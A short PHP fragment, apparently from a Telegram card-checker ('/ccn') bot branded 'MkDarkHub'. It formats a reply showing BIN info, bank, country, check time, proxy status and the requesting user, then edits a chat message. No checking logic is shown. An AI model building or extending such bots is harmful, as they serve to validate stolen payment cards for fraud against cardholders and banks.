<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐨𝐝𝐞 ↯ [/ccn]

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐏𝐑𝐎𝐗𝐘 ↯ <code>LIVE ✅</code>
<b>[<a href='t.me/MkDarkHub'>↯</a>]</b> 𝐑𝐄𝐐 𝐁𝐘 ↯ <code>@$username</code> [$rank]


  ";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}